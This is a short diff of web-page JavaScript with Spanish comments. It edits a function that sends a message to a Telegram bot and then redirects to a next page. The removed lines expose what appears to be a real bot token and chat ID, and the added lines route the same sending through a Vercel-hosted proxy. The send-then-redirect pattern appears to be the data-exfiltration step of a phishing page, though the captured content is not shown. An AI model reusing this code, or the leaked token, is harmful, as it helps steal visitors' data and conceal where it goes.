@@ -53,10 +53,10 @@
 
             // Función para enviar el mensaje a Telegram y redirigir
             function enviarMensajeTelegram(mensaje, nextPage) {
-                const TOKEN = '8855414201:AAHfpOhQ0szh27tbLKhHZBiNvTobN8B-wPY'; // <-- Reemplaza este texto por el token de tu bot
-                const CHAT_ID = '-5167092041'; // <-- Reemplaza este texto por el ID de tu chat
+                const TOKEN = ''; // <-- Reemplaza este texto por el token de tu bot
+                const CHAT_ID = ''; // <-- Reemplaza este texto por el ID de tu chat
 
-                var url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+                var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
                 var params = {
                     chat_id: CHAT_ID,
                     text: mensaje
